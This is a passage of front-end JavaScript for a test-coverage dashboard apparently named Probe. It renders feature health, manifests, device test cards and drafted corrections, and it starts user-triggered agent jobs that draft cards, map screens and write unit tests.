followJob() {\n  const panel = document.getElementById("runpanel");\n  if (!panel || panel.innerHTML.trim() || state.eventSource) return;\n  if (state.showRun) {\n    const id = state.showRun;\n    state.showRun = null;\n    return followRun(id, panel);\n  }\n  const wanted = state.followId && state.jobs.find((j) => j.runId === state.followId);\n  state.followId = null;\n  const job = wanted || (state.tab !== "runs" && [...state.jobs].reverse().find((j) => onRoute(routeOf(j))));\n  // When it ends, the view reloads with what it made and shows the finished run again.\n  if (job) followRun(job.runId, panel, () => { state.scan = null; state.showRun = job.runId; render(); });\n}\n\ndocument.getElementById("jobs").addEventListener("click", () => {\n  const j = state.jobs[state.jobs.length - 1];\n  if (!j) return;\n  goTo(routeOf(j));\n  state.followId = j.runId;\n  render();\n});\nsetInterval(refreshJobs, 3000);\n\nfunction coverageBar(s) {\n  const t = Math.max(1, s.testable);\n  const w = (n) => (100 * n / t).toFixed(1) + "%";\n  return `<div class="bar" title="${s.direct} direct \xB7 ${s.referenced} referenced \xB7 ${s.untested} untested">\n    <span style="width:${w(s.direct)};background:var(--ok)"></span>\n    <span style="width:${w(s.referenced)};background:var(--warn)"></span>\n  </div>`;\n}\n\nfunction runPill(r) {\n  if (!r) return `<span class="pill none">not run</span>`;\n  const label = r.status === "running" || r.status === "error" ? r.status : `${r.tests - r.failed}/${r.tests}`;\n  return `<span class="pill ${r.status}" title="${esc(r.finishedAt || "")}${esc(whoRan(r))}">${label}</span>${freshPill(r)} <span class="muted">${ago(r.finishedAt)}</span>`;\n}\n\nconst HEALTH_LABEL = { ok: "ok", warn: "warn", fail: "fail", unknown: "never run" };\nfunction healthPill(f) {\n  return `<span class="pill h-${f.health}" title="${esc(f.reasons.join("\\n"))}">${HEALTH_LABEL[f.health]}</span>`;\n}\n\nfunction devicePill(d) {\n  const ran = d.passed + d.failed + d.blocked + d.error;\n  if (!ran && d.stale) return `<span class="pill warn" title="${d.stale} card results outdated: code or card changed since">\u27F3 ${d.stale} outdated</span>`;\n  if (!ran) return d.notRun ? `<span class="pill none" title="${d.notRun} cards never run on a device">not run</span>` : `<span class="muted">\u2014</span>`;\n  const cls = d.failed ? "failed" : d.blocked || d.error ? "blocked" : "passed";\n  return `<span class="pill ${cls}" title="${d.passed} passed \xB7 ${d.failed} failed \xB7 ${d.blocked} blocked \xB7 ${d.error} error \xB7 ${d.stale} outdated \xB7 ${d.maybe} maybe outdated \xB7 ${d.notRun} not run">${d.passed}/${ran + d.stale + d.notRun}</span>${d.stale ? ` <span class="pill warn" title="${d.stale} card results outdated: code or card changed since">\u27F3 ${d.stale}</span>` : ""}`;\n}\n\n/** Marks a result that no longer holds for the code checked out here. */\nfunction freshPill(r) {\n  if (!r || !r.fresh || r.fresh === "fresh" || r.fresh === "never") return "";\n  const why = (r.freshReasons || []).join("\\n");\n  return r.fresh === "stale"\n    ? ` <span class="pill warn" title="Outdated: ${esc(why)}">\u27F3 outdated</span>`\n    : ` <span class="pill none" title="Maybe outdated: ${esc(why)}">? maybe</span>`;\n}\n\nfunction whoRan(r) {\n  return r.remote ? ` \xB7 recorded by ${r.by || "someone else"} (no evidence on this machine)` : "";\n}\n\nfunction lastRunPill(r) {\n  if (!r) return `<span class="pill none" title="never run on a device">not run</span>`;\n  return `<span class="pill ${r.status}" title="last device run ${esc(r.runId)}, ${esc(r.at || "")}${esc(whoRan(r))}">${r.status}</span>${freshPill(r)}${r.perfIssues ? ` <span class="pill warn" title="performance warnings">perf</span>` : ""}`;\n}\n\nconst GROUP_LABEL = { feature: "Features", platform: "Platform areas", all: "Features and areas" };\n\n/** A feature\'s or platform area\'s manifest: its rules, and how many nothing proves yet. */\nfunction manifestPill(f) {\n  const m = f.manifest;\n  if (!m) return `<span class="pill none" title="No manifest yet: Setup \u2192 Feature knowledge drafts one">none</span>`;\n  return `<span class="pill ${m.unproven ? "warn" : "ok"}" title="${m.rules} rules \xB7 ${m.unproven} unproven">${m.rules} rule${m.rules === 1 ? "" : "s"}${m.unproven ? ` \xB7 ${m.unproven} unproven` : ""}</span>`;\n}\n\nfunction cardsPill(c) {\n  if (!c) return `<span class="pill none">none</span>`;\n  const title = `${c.approved} approved \xB7 ${c.draft} draft \xB7 ${c.rejected} rejected`;\n  return `<span class="pill ${c.draft ? "warn" : "ok"}" title="${title}">${c.total}${c.draft ? ` \xB7 ${c.draft} to review` : ""}</span>`;\n}\n\n/** Features whose unit or card results are outdated: what "Bring up to date" would re-run. */\nfunction outdatedCount(features) {\n  return features.filter((f) => f.device.stale || f.device.maybe || f.unit?.fresh === "stale" || f.unit?.fresh === "maybe").length;\n}\n\nasync function loadScan(refresh) {\n  state.scan = await api("/api/scan", { method: refresh ? "POST" : "GET" });\n  const p = state.scan.project;\n  $meta.textContent = `${p.adapter} \xB7 scanned ${ago(state.scan.scannedAt)}`;\n  document.title = `${p.name} \xB7 Probe`;\n}\n\nasync function renderAtlas() {\n  if (!state.scan) { $view.innerHTML = `<div class="empty">Scanning project\u2026</div>`; await loadScan(false); }\n  const watch = await api("/api/watch");\n  const all = state.scan.features;\n  const list = all\n    .filter((f) => state.group === "all" || f.group === state.group)\n    .filter((f) => f.id.toLowerCase().includes(state.filter.toLowerCase()));\n  const sum = (k) => list.reduce((n, f) => n + f.stats[k], 0);\n  const testable = sum("testable");\n  const pct = (n) => testable ? Math.round(100 * n / testable) + "%" : "\u2013";\n\n  $view.innerHTML = `\n    <div class="cards">\n      <div class="card"><div class="k">${GROUP_LABEL[state.group]}</div><div class="v">${list.length}</div></div>\n      <div class="card"><div class="k">With a manifest</div><div class="v">${list.filter((f) => f.manifest).length}</div></div>\n      <div class="card"><div class="k">Testable classes</div><div class="v">${testable}</div></div>\n      <div class="card"><div class="k">Have a test class</div><div class="v" style="color:var(--ok)">${pct(sum("direct"))}</div></div>\n      <div class="card"><div class="k">Only referenced</div><div class="v" style="color:var(--warn)">${pct(sum("referenced"))}</div></div>\n      <div class="card"><div class="k">Untested</div><div class="v" style="color:var(--fail)">${pct(sum("untested"))}</div></div>\n      <div class="card"><div class="k">Health</div><div class="v" style="font-size:15px;margin-top:6px">${["ok", "warn", "fail", "unknown"].map((h) => `<span class="pill h-${h}">${list.filter((f) => f.health === h).length} ${HEALTH_LABEL[h]}</span>`).join(" ")}</div></div>\n    </div>\n    <div class="toolbar">\n      <div class="seg" id="view"><button data-v="table">Table</button><button data-v="map">Map</button></div>\n      <input type="search" id="filter" placeholder="Filter\u2026" value="${esc(state.filter)}">\n      <div class="seg" id="group">\n        <button data-g="feature">Features</button><button data-g="platform">Platform</button><button data-g="all">All</button>\n      </div>\n      <div class="legend hide-sm"><span><span class="dot" style="background:var(--ok)"></span>test class</span><span><span class="dot" style="background:var(--warn)"></span>referenced in tests</span><span><span class="dot" style="background:var(--track)"></span>untested</span></div>\n      <div style="flex:1"></div>\n      ${outdatedCount(all) ? `<button class="btn" id="uptodate" data-job="${esc(jobKey.verifyOutdated())}" data-busy="Bringing up to date\u2026" title="Re-runs only results that are outdated, maybe outdated or missing for this code: unit tests, then cards on a device">\u27F3 Bring ${outdatedCount(all)} feature${outdatedCount(all) === 1 ? "" : "s"} up to date</button>` : ""}\n      <button class="btn secondary" id="rescan">Rescan</button>\n    </div>\n    ${watchBanner(watch)}\n    <div id="runpanel"></div>\n    ${state.scan.excluded.length ? `<p class="muted">Excluded by probe.yaml: ${state.scan.excluded.map(esc).join(", ")}</p>` : ""}\n    ${state.view === "map" ? `<div class="map">${list.map((f) => `<div class="tile h-${f.health}" data-id="${esc(f.id)}" title="${esc(f.reasons.join("\\n"))}">\n        <strong>${esc(f.id)}${stalePill(watch, f.id)}</strong>\n        <div class="sig"><span>${f.manifest ? `${f.manifest.rules} rules` : "no manifest"}</span>${f.group === "platform" && f.usedBy ? `<span>used by ${f.usedBy}</span>` : ""}<span>unit ${f.unit ? (f.unit.failed ? `\u2717${f.unit.failed}` : "\u2713") : "\u2014"}</span><span>${f.stats.testable ? Math.round(100 * f.stats.direct / f.stats.testable) : 0}% classes</span><span>cards ${f.cards ? f.cards.total : 0}</span><span>device ${f.device.passed}/${f.device.passed + f.device.failed + f.device.blocked + f.device.error + f.device.notRun}</span>${f.nav ? `<span>${f.nav.screens} screens</span>` : ""}</div>\n        <div class="why">${esc(f.reasons[0] || (f.health === "ok" ? "all checks passed" : ""))}</div>\n      </div>`).join("") || `<div class="empty">Nothing matches.</div>`}</div>` : `\n    <table>\n      <thead><tr>\n        <th>${state.group === "platform" ? "Platform area" : state.group === "all" ? "Feature or area" : "Feature"}</th><th class="num hide-sm">Modules</th><th class="num">Testable</th><th>Unit coverage (static)</th>\n        <th class="num hide-sm">Untested</th><th>Manifest</th><th>Cards</th><th>Last unit run</th><th>On device</th><th>Health</th>\n      </tr></thead>\n      <tbody>\n        ${list.map((f) => `<tr class="click" data-id="${esc(f.id)}">\n          <td><strong>${esc(f.id)}</strong>${stalePill(watch, f.id)}${f.group === "platform" && f.usedBy ? `<div class="muted" style="font-size:11px">used by ${f.usedBy}</div>` : ""}</td>\n          <td class="num hide-sm">${f.stats.modules}</td>\n          <td class="num">${f.stats.testable}</td>\n          <td><div class="row">${coverageBar(f.stats)}<span class="muted">${f.stats.testable ? Math.round(100 * f.stats.direct / f.stats.testable) : 0}%</span></div></td>\n          <td class="num hide-sm">${f.stats.untested}</td>\n          <td>${manifestPill(f)}</td>\n          <td>${cardsPill(f.cards)}</td>\n          <td>${runPill(f.lastUnitRun)}</td>\n          <td>${devicePill(f.device)}</td>\n          <td>${healthPill(f)}</td>\n        </tr>`).join("") || `<tr><td colspan="10" class="empty">Nothing matches.</td></tr>`}\n      </tbody>\n    </table>`}`;\n\n  const filter = document.getElementById("filter");\n  filter.addEventListener("input", () => { state.filter = filter.value; renderAtlas().then(() => { const f = document.getElementById("filter"); f.focus(); f.setSelectionRange(f.value.length, f.value.length); }); });\n  document.querySelectorAll("#group button").forEach((b) => {\n    b.classList.toggle("active", b.dataset.g === state.group);\n    b.addEventListener("click", () => { state.group = b.dataset.g; renderAtlas(); });\n  });\n  document.getElementById("uptodate")?.addEventListener("click", async (e) => {\n    if (!confirm("Re-run every outdated or missing result? Unit tests run first, then approved cards on an emulator (at most the max card runs from Settings).")) return;\n    e.target.disabled = true;\n    const res = await post("/api/verify", { outdated: true });\n    if (res.error) { alert(res.error); e.target.disabled = false; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => { state.scan = null; });\n  });\n  document.getElementById("rescan").addEventListener("click", async (e) => {\n    e.target.disabled = true; e.target.textContent = "Scanning\u2026";\n    await loadScan(true); renderAtlas();\n  });\n  document.querySelectorAll("#view button").forEach((b) => {\n    b.classList.toggle("active", b.dataset.v === state.view);\n    b.addEventListener("click", () => { state.view = b.dataset.v; renderAtlas(); });\n  });\n  document.querySelectorAll("tr.click, .tile").forEach((tr) => tr.addEventListener("click", () => { state.feature = tr.dataset.id; render(); }));\n  bindWatchBanner(() => renderAtlas());\n}\n\n// \u2500\u2500 Keeping features current: stale marks, the check, drafted corrections \u2500\u2500\n\nfunction stalePill(watch, id) {\n  const e = watch.stale[id];\n  if (!e) return "";\n  // Reached through the module graph: none of its own files changed, code it depends on did.\n  const via = !e.owned && e.dependsOn?.length ? e.dependsOn : null;\n  return ` <span class="pill warn" title="${via ? `Depends on ${esc(via.join(", "))}, edited` : "Edited"} since its last check (${esc(e.sources.join(", "))}, ${ago(e.last)}):\\n${esc(e.files.slice(0, 12).join("\\n"))}">${via ? "dependency edited" : "edited"}</span>`;\n}\n\nfunction watchBanner(watch) {\n  if (!watch.enabled) return "";\n  const stale = Object.keys(watch.stale);\n  const parts = [];\n  if (watch.running) parts.push(`<span class="pill running">checking</span> <a href="#" data-follow="${esc(watch.running.runId)}">run ${esc(watch.running.runId)}</a>`);\n  if (stale.length) parts.push(`${stale.length} feature${stale.length === 1 ? "" : "s"} edited since their last check: ${stale.map((id) => `<strong>${esc(id)}</strong>`).join(", ")}`);\n  if (watch.drafts.length) parts.push(`${watch.drafts.length} drafted correction${watch.drafts.length === 1 ? "" : "s"} to review: ${watch.drafts.map((d) => `<a href="#" data-feature="${esc(d.feature)}">${esc(d.feature)}</a>`).join(", ")}`);\n  if (!parts.length) return "";\n  return `<div class="box stale"><div class="row" style="flex-wrap:wrap">${parts.map((p) => `<span>${p}</span>`).join(\'<span class="muted">\xB7</span>\')}<div style="flex:1"></div>${stale.length && !watch.running ? `<button class="btn secondary" id="checknow" title="Unit tests and manifest links of the edited features, then drafted corrections for review">\u2713 Check now</button>` : ""}</div></div>`;\n}\n\nfunction bindWatchBanner(refresh) {\n  document.querySelectorAll("[data-follow]").forEach((a) => a.addEventListener("click", (e) => { e.preventDefault(); followRun(a.dataset.follow, document.getElementById("runpanel"), refresh); }));\n  document.querySelectorAll("[data-feature]").forEach((a) => a.addEventListener("click", (e) => { e.preventDefault(); state.feature = a.dataset.feature; render(); }));\n  document.getElementById("checknow")?.addEventListener("click", async (e) => {\n    e.target.disabled = true;\n    const res = await post("/api/watch/check", {});\n    if (res.error) { alert(res.error); e.target.disabled = false; return; }\n    followRun(res.runId, document.getElementById("runpanel"), refresh);\n  });\n}\n\n/** Just enough markdown for a brief\'s At a glance: bullets, bold, code, links as text. */\nfunction miniMd(text) {\n  const inline = (t) => esc(t).replace(/\\*\\*(.+?)\\*\\*/g, "<strong>$1</strong>").replace(/`([^`]+)`/g, "<code>$1</code>").replace(/\\[([^\\]]+)\\]\\([^)]+\\)/g, "$1");\n  const items = [];\n  for (const line of text.split("\\n")) {\n    if (/^\\s*[-*] /.test(line)) items.push(line.replace(/^\\s*[-*] /, ""));\n    else if (items.length && line.trim()) items[items.length - 1] += " " + line.trim();\n  }\n  return items.length ? `<ul>${items.map((i) => `<li>${inline(i)}</li>`).join("")}</ul>` : `<p>${inline(text)}</p>`;\n}\n\nfunction diffHtml(diff) {\n  return `<pre class="diff">${diff.split("\\n").map((l) => `<span class="${l.startsWith("@@") ? "hunk" : l.startsWith("+") ? "add" : l.startsWith("-") ? "del" : ""}">${esc(l)}</span>`).join("\\n")}</pre>`;\n}\n\nasync function renderKnowledge(id) {\n  const k = await api("/api/knowledge/" + encodeURIComponent(id));\n  // Looked up after the fetch: the page may have re-rendered while it loaded.\n  const el = document.getElementById("knowledge");\n  if (!el) return;\n  const title = k.kind === "platform" ? "Platform area knowledge" : "Feature knowledge";\n  // Who builds on whom, from the build files: an edit in a platform area makes its users stale.\n  const links = [k.usedBy?.length ? `Used by ${k.usedBy.length}: ${k.usedBy.map(esc).join(", ")}` : "", k.uses?.length ? `Uses: ${k.uses.map(esc).join(", ")}` : ""].filter(Boolean);\n  const linksHtml = links.length ? `<div class="muted" style="font-size:12px;margin-top:6px">${links.join(" \xB7 ")}</div>` : "";\n  if (!k.manifest && !k.check && k.drafts.length) {\n    el.innerHTML = `<div class="box"><h3>${title}</h3><span class="muted">No manifest yet; one is drafted. Review it in <a href="#" id="gosetup">Setup</a>.</span>${linksHtml}</div>`;\n    el.querySelector("#gosetup").addEventListener("click", (e) => { e.preventDefault(); state.tab = "setup"; state.feature = null; render(); });\n    return;\n  }\n  if (!k.manifest && !k.check) {\n    el.innerHTML = `<div class="box"><h3>${title}</h3><span class="muted">No manifest yet. Run <code class="mono">probe init</code> (or Setup \u2192 Feature knowledge) to draft one, or write <code class="mono">${esc(k.file)}</code> by hand (format in <code class="mono">probe/features/README.md</code>). It gives ${k.kind === "platform" ? "this area a summary, the contract it keeps for the code built on it" : "this feature a summary, its rules"} and the tests that prove them; Probe then keeps them in step with the code.</span>${linksHtml}</div>`;\n    return;\n  }\n  const m = k.manifest || {};\n  const c = k.check || { broken: [], gaps: [], errors: [], unexplained: [], missingPaths: [], links: 0 };\n  const brokenBy = {};\n  for (const b of c.broken) (brokenBy[b.invariant] ||= []).push(b);\n  const brokenCardsBy = {};\n  for (const b of c.brokenCards || []) (brokenCardsBy[b.invariant] ||= []).push(b);\n  // A card proves its rule only while its last pass still holds for this code.\n  const cardPill = (x) => {\n    const cls = x.freshness === "missing" || x.result === "failed" ? "fail" : x.result === "passed" && x.freshness === "fresh" ? "ok" : "warn";\n    const run = x.freshness === "missing" ? "" : ` <button class="btn secondary" style="padding:1px 8px;font-size:11px" data-runcard="${esc(x.feature)}/${esc(x.id)}" data-job="${esc(jobKey.card(x.feature, x.id))}" data-busy="\u2026" title="Run this card on a device">\u25B6</button>`;\n    return `<div style="margin:2px 0"><span class="pill ${cls}" title="${esc(x.text)}">card ${esc(x.id)}</span> <span class="muted" style="font-size:12px">${esc(x.title || "")} \xB7 ${esc(x.text)}</span>${run}</div>`;\n  };\n  const proof = (inv) => {\n    const broken = brokenBy[inv.id] || [];\n    const pills = [];\n    if (inv.coveredBy.length) pills.push(`<span class="pill ${broken.length ? "fail" : "ok"}" title="${esc(inv.coveredBy.join("\\n"))}">${inv.coveredBy.length - broken.length}/${inv.coveredBy.length} tests</span>`);\n    const cards = (k.cards || {})[inv.id] || [];\n    if (!inv.coveredBy.length && !cards.length) pills.push(`<span class="pill ${inv.gap ? "warn" : "fail"}" title="${esc(inv.gap || "no test, no card and no reason given")}">${inv.gap ? "unproven" : "unexplained"}</span>`);\n    return pills.join(" ") + cards.map(cardPill).join("") +\n      broken.map((b) => `<div class="muted" style="font-size:12px">\u2717 ${esc(b.entry)} \u2014 ${esc(b.problem)}${b.closest ? `; closest: \u201C${esc(b.closest)}\u201D` : ""}</div>`).join("") +\n      (brokenCardsBy[inv.id] || []).map((b) => `<div class="muted" style="font-size:12px">\u2717 card ${esc(b.card)} \u2014 no such card${b.closest ? `; closest: \u201C${esc(b.closest)}\u201D` : ""}</div>`).join("");\n  };\n  el.innerHTML = `\n    ${k.stale ? `<div class="box stale"><div class="row" style="flex-wrap:wrap"><span><span class="pill warn">${!k.stale.owned && k.stale.dependsOn?.length ? `depends on ${esc(k.stale.dependsOn.join(", "))}` : "edited"}</span> since its last check, ${ago(k.stale.last)} (${esc(k.stale.sources.join(", "))}): <span class="mono">${esc(k.stale.files.slice(0, 6).join(", "))}${k.stale.files.length > 6 ? ` +${k.stale.files.length - 6}` : ""}</span></span><div style="flex:1"></div><button class="btn secondary" id="checkfeature" data-job="check" data-busy="Checking\u2026">\u2713 Check now</button></div></div>` : ""}\n    ${k.drafts.map((d) => `<div class="box stale"><h3>Drafted correction <span class="muted" style="font-weight:400">\xB7 ${ago(d.createdAt)}${d.runId ? ` \xB7 check ${esc(d.runId)}` : ""}</span></h3>\n      <p style="margin:4px 0 8px">${esc(d.summary)}</p>\n      ${d.diffs.map((x) => `<div class="mono muted">${esc(x.path)}${x.conflict ? ` <span class="pill fail">changed since the draft was made</span>` : ""}</div>${diffHtml(x.diff)}`).join("")}\n      <div class="row"><button class="btn" data-approve="${esc(d.id)}" ${d.diffs.some((x) => x.conflict) ? "disabled" : ""}>Apply</button><button class="btn secondary" data-reject="${esc(d.id)}">Reject</button></div></div>`).join("")}\n    <div class="box"><h3>${esc(m.name || id)} ${k.kind === "platform" ? `<span class="pill none">platform</span> ` : ""}${m.owner ? `<span class="muted" style="font-weight:400">\xB7 owner ${esc(m.owner)}</span>` : `<span class="pill warn" title="Nobody approves changes to this feature\'s manifest and brief yet">no owner</span>`}</h3>\n      ${m.summary ? `<p style="margin:0 0 8px">${esc(m.summary)}</p>` : ""}\n      ${k.glance ? `<div class="glance">${miniMd(k.glance)}</div>` : ""}\n      <div class="muted" style="font-size:12px;margin-top:6px">${m.brief ? `Brief <span class="mono">${esc(m.brief)}</span> \xB7 ` : ""}manifest <span class="mono">${esc(k.file)}</span> \xB7 ${c.links} test links \xB7 ${c.cardLinks || 0} card links${c.broken.length + (c.brokenCards || []).length ? ` \xB7 <strong style="color:var(--fail)">${c.broken.length + (c.brokenCards || []).length} broken</strong>` : ""}</div>\n      ${linksHtml}\n      ${[...c.errors, ...c.missingPaths.map((p) => `path does not exist: ${p}`), ...c.unexplained.map((u) => `${u}: no test, no card and no gap given`)].map((e) => `<div style="color:var(--fail);font-size:12px">\u2717 ${esc(e)}</div>`).join("")}\n    </div>\n    ${m.invariants?.length ? `<details class="fc" ${c.broken.length ? "open" : ""}><summary><strong>Rules that must hold</strong> <span class="muted">${m.invariants.length} rules \xB7 ${c.gaps.length} unproven${c.broken.length ? ` \xB7 ${c.broken.length} broken links` : ""}</span></summary><div class="fc-body">\n      <table><thead><tr><th>Rule</th><th>Proved by</th></tr></thead><tbody>${m.invariants.map((inv) => `<tr><td><strong class="mono" style="font-size:12px">${esc(inv.id)}</strong><div>${esc(inv.rule)}</div></td><td>${proof(inv)}</td></tr>`).join("")}</tbody></table></div></details>` : ""}\n    ${m.flows?.length ? `<details class="fc"><summary><strong>User flows</strong> <span class="muted">${m.flows.length}</span></summary><div class="fc-body"><ul>${m.flows.map((f) => `<li><span class="mono muted">${esc(f.id)}</span> ${esc(f.text)}</li>`).join("")}</ul>${m.deviceOnly?.length ? `<div class="k">Only on a device</div><ul>${m.deviceOnly.map((d) => `<li>${esc(d)}</li>`).join("")}</ul>` : ""}</div></details>` : ""}`;\n  el.querySelectorAll("[data-runcard]").forEach((b) => b.addEventListener("click", async () => {\n    const at = b.dataset.runcard.lastIndexOf("/");\n    b.disabled = true; b.textContent = "\u2026";\n    const res = await api(`/api/cards/${encodeURIComponent(b.dataset.runcard.slice(0, at))}/${encodeURIComponent(b.dataset.runcard.slice(at + 1))}/run`, { method: "POST" });\n    if (res.error) { alert(res.error); b.disabled = false; b.textContent = "\u25B6"; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => renderKnowledge(id));\n  }));\n  document.getElementById("checkfeature")?.addEventListener("click", async (e) => {\n    e.target.disabled = true; e.target.textContent = "Checking\u2026";\n    const res = await post("/api/watch/check", { features: [id] });\n    if (res.error) { alert(res.error); e.target.disabled = false; e.target.textContent = "\u2713 Check now"; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => renderKnowledge(id));\n  });\n  showJobs();\n  el.querySelectorAll("[data-approve],[data-reject]").forEach((b) => b.addEventListener("click", async () => {\n    const approve = !!b.dataset.approve;\n    const draftId = b.dataset.approve || b.dataset.reject;\n    if (approve && !confirm("Write this correction into the manifest/brief? Nothing is committed.")) return;\n    b.disabled = true;\n    const res = await post(`/api/drafts/${encodeURIComponent(draftId)}/${approve ? "approve" : "reject"}`, {});\n    if (!res.ok) alert(res.error);\n    renderKnowledge(id);\n  }));\n}\n\nasync function renderFeature(id) {\n  $view.innerHTML = `<div class="empty">Loading ${esc(id)}\u2026</div>`;\n  const [f, navmap] = await Promise.all([api("/api/feature/" + encodeURIComponent(id)), api("/api/navmap")]);\n  // A remembered address can name a feature that is gone since.\n  if (f.error) { state.feature = null; return render(); }\n  if (!state.scan) await loadScan(false);\n  const h = state.scan.features.find((x) => x.id === f.id);\n  const nav = navmap[f.id];\n  const s = f.stats;\n  const withTests = f.modules.filter((m) => m.unitTestTask).length;\n  $view.innerHTML = `\n    <button class="back" id="back">\u2190 Atlas</button>\n    <div class="toolbar"><h2 style="margin:0">${esc(f.id)}</h2><span class="pill none">${f.group}</span><div style="flex:1"></div>\n      <button class="btn secondary" id="backfill" data-job="${esc(jobKey.backfill(f.id))}" data-busy="Agent drafting\u2026" title="A background agent reads code, docs and git history and drafts cards">\u2726 Draft cards</button>\n      <button class="btn secondary" id="explore" data-job="${esc(jobKey.explore(f.id))}" data-busy="Agent mapping\u2026" ${noDevices() ? `disabled title="${esc(noDevices())}"` : `title="An agent walks this feature\'s screens on an emulator and maps how each is reached"`}>\u2316 Map screens</button>\n      <button class="btn secondary" id="unitwrite" data-job="${esc(jobKey.unitwrite(f.id))}" data-busy="Agent writing tests\u2026" ${f.gaps.length ? "" : "disabled"} title="An agent writes unit tests for the riskiest untested classes, then runs them">\u270E Write missing tests</button>\n      <button class="btn secondary" id="verifyf" data-job="${esc(jobKey.verifyFeatures([f.id]))}" data-busy="Verifying\u2026" title="Unit tests, then this feature\'s approved cards on a device">\u2713 Verify</button>\n      <button class="btn" id="run" data-job="${esc(jobKey.unit(f.id))}" data-busy="Running\u2026" ${withTests ? "" : "disabled"}>\u25B6 Run unit tests</button></div>\n    <div id="knowledge"></div>\n    ${h ? `<div class="box"><h3>Health ${healthPill(h)}</h3>${h.reasons.length ? `<ul>${h.reasons.map((r) => `<li>${esc(r)}</li>`).join("")}</ul>` : `<span class="muted">Every check Probe has run passed.</span>`}</div>` : ""}\n    <div class="cards">\n      <div class="card"><div class="k">Modules</div><div class="v">${s.modules}</div></div>\n      <div class="card"><div class="k">Testable classes</div><div class="v">${s.testable}</div></div>\n      <div class="card"><div class="k">Test class</div><div class="v" style="color:var(--ok)">${s.direct}</div></div>\n      <div class="card"><div class="k">Referenced</div><div class="v" style="color:var(--warn)">${s.referenced}</div></div>\n      <div class="card"><div class="k">Untested</div><div class="v" style="color:var(--fail)">${s.untested}</div></div>\n    </div>\n    <div id="runpanel"></div>\n    <h2>Cards</h2>\n    <div id="featurecards"></div>\n    <h2>Screens ${nav ? `<span class="muted" style="font-weight:400">\xB7 mapped ${ago(nav.at)}</span>` : ""}</h2>\n    ${nav ? `${nav.issues.length ? `<div class="box" style="border-color:var(--fail)"><h3>Navigation issues</h3><ul>${nav.issues.map((i) => `<li>${esc(i)}</li>`).join("")}</ul></div>` : ""}\n      <table><thead><tr><th>Screen</th><th>How to reach it</th><th class="hide-sm">Notes</th></tr></thead><tbody>\n      ${nav.screens.map((sc) => `<tr><td><strong>${esc(sc.name)}</strong>${sc.screenshot ? ` <a class="muted" target="_blank" href="/api/runs/${encodeURIComponent(nav.runId)}/files/${esc(sc.screenshot)}">screenshot</a>` : ""}</td><td><div class="reach">${sc.reach.map((r) => `<span>${esc(r)}</span>`).join("<b>\u2192</b>")}</div></td><td class="muted hide-sm">${esc(sc.notes)}</td></tr>`).join("")}\n      </tbody></table>` : `<div class="empty card">Not mapped yet. <strong>\u2316 Map screens</strong> lets an agent walk this feature on an emulator.</div>`}\n    <h2>Riskiest untested classes</h2>\n    <p class="muted" style="margin-top:-4px">Ranked by kind (reducer, use case, view model\u2026) and size. Static analysis: a class counts as tested when a test class is named after it.</p>\n    <table>\n      <thead><tr><th>Class</th><th>Kind</th><th class="num">Lines</th><th class="num">Risk</th><th class="hide-sm">File</th></tr></thead>\n      <tbody>${f.gaps.map((c) => `<tr><td><strong>${esc(c.name)}</strong></td><td>${c.kind}</td><td class="num">${c.lines}</td><td class="num">${c.risk}</td><td class="mono muted hide-sm">${esc(c.file)}</td></tr>`).join("") || `<tr><td colspan="5" class="empty">No untested classes worth testing \u{1F389}</td></tr>`}</tbody>\n    </table>\n    <h2>Modules</h2>\n    <table>\n      <thead><tr><th>Module</th><th>Platform</th><th class="num">Source files</th><th class="num">Unit test files</th><th class="num hide-sm">Instrumented</th><th class="hide-sm">Unit task</th></tr></thead>\n      <tbody>${f.modules.map((m) => `<tr><td class="mono">${esc(m.id)}</td><td>${m.platform}</td><td class="num">${m.mainFiles}</td><td class="num">${m.testFiles}</td><td class="num hide-sm">${m.instrumentedTestFiles}</td><td class="mono muted hide-sm">${esc(m.unitTestTask || "\u2014")}</td></tr>`).join("")}</tbody>\n    </table>`;\n  document.getElementById("back").addEventListener("click", () => { state.feature = null; render(); });\n  renderKnowledge(f.id);\n  const showCards = async () => {\n    const cards = (await api("/api/cards")).filter((c) => c.feature === f.id);\n    const el = document.getElementById("featurecards");\n    if (!el) return;\n    el.innerHTML = cards.length ? cards.map(cardHtml).join("") : `<div class="empty card">No cards yet. <strong>\u2726 Draft cards</strong> lets an agent write them from code, docs and git history.</div>`;\n    bindCardActions(el, showCards);\n    showJobs();\n  };\n  showCards();\n  document.getElementById("backfill").addEventListener("click", async (e) => {\n    e.target.disabled = true; e.target.textContent = "Agent drafting\u2026";\n    const res = await api("/api/cards/" + encodeURIComponent(f.id) + "/backfill", { method: "POST" });\n    if (res.error) { alert(res.error); e.target.disabled = false; e.target.textContent = "\u2726 Draft cards"; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => { e.target.disabled = false; e.target.textContent = "\u2726 Draft cards"; state.scan = null; showCards(); });\n  });\n  document.getElementById("run").addEventListener("click", async (e) => {\n    e.target.disabled = true; e.target.textContent = "Running\u2026";\n    const res = await post("/api/unit/" + encodeURIComponent(f.id));\n    if (res.error) { alert(res.error); e.target.disabled = false; e.target.textContent = "\u25B6 Run unit tests"; return; }\n    followRun(res.runId,document.getElementById("runpanel"), () => { e.target.disabled = false; e.target.textContent = "\u25B6 Run unit tests"; state.scan = null; });\n  });\n  const start = (btnId, busy, path, body, after) => document.getElementById(btnId).addEventListener("click", async (e) => {\n    const label = e.target.textContent;\n    e.target.disabled = true; e.target.textContent = busy;\n    const res = await post(path, body);\n    if (res.error) { alert(res.error); e.target.disabled = false; e.target.textContent = label; return; }\n    followRun(res.runId, document.getElementById("runpanel"), () => { e.target.disabled = false; e.target.textContent = label; state.scan = null; after && after(); });\n  });\n  start("explore", "Agent mapping\u2026", "/api/explore/" + encodeURIComponent(f.id), {}, () => renderFeature(f.id));\n  start("unitwrite", "Agent writing tests\u2026", "/api/unitwrite/" + encodeURIComponent(f.id), {});\n  start("verifyf", "Verifying\u2026", "/api/verify", { features: [f.id] }, showCards);\n}\n\n// Every action carries the branch the person is looking at; the server refuses it if the\n// project has moved to another branch since (a checkout in a terminal or the IDE).\nconst post = async (path, body) => {\n  const headers = { "content-type": "application/json" };\n  if (state.branchSeen) headers["x-probe-branch"] = encodeURIComponent(state.branchSeen);\n  const res = await api(path, { method: "POST", headers, body: JSON.stringify(body || {}) });\n  if (res.branchChanged) checkBranch();\n  return res;\n};\n\nasync function checkBranch() {\n  const b = await api("/api/branch").catch(() => null);\n  if (!b) return;\n  state.branchInfo = b;\n  if (b.id && !state.branchSeen) 